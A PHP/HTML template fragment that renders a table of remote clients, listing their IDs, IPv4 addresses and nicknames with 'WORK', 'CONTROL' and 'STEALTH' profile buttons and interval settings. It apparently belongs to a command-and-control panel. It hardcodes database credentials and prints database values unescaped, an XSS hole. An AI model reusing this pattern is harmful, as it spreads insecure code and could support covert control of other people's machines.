<div class="xtime-pane">
    <div class="xtime-container">
        <div class="xtime-lower">
                <div class="xtime-table">
                    <table>
                        <thead>
                            <tr>
                                <th>xClientID</th>
                                <th>IPv4</th>
                                <th>Nickname</th>
                                <th>WORK Profile</th>
                                <th>CONTROL Profile</th>
                                <th>STEALTH Profile</th>
                                <th>Interval Slider</th>
                                <th>Costum Interval</th>
                                <th>Save</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');

                            $stmt = $pdo->prepare('SELECT xid, ip, nickname FROM xclients');
                            $stmt->execute();
                            $clients = $stmt->fetchAll(PDO::FETCH_ASSOC);

                            foreach ($clients as $client) {
                                echo '<tr class="xtime-client-row" data-xid="' . $client['xid'] . '">';
                                echo '<td><a href="xtime_info.php?xid=' . $client['xid'] . '">' . $client['xid'] . '</a></td>';
                                echo '<td>' . $client['ip'] . '</td>';
                                echo '<td>' . $client['nickname'] . '</td>';
                                echo '<td><button class="xtimeinvalbutton"><img src="/pic/button_control.png" alt="Previous" width="60" height="18"></button></td>';
                                echo '<td><button class="xtimeinvalbutton"><img src="/pic/button_work.png" alt="Previous" width="60" height="18"></button></td>';
                                echo '<td><button class="xtimeinvalbutton"><img src="/pic/button_stealth.png" alt="Previous" width="60" height="18"></button></td>';
                                echo '<td><input type="range" min="0" max="100"></td>';
                                echo '<td><input type="text" placeholder="Input Field"></td>';
                                echo '<td><button>Submit</button></td>';
                                echo '</tr>';
                            }
                            ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
</div>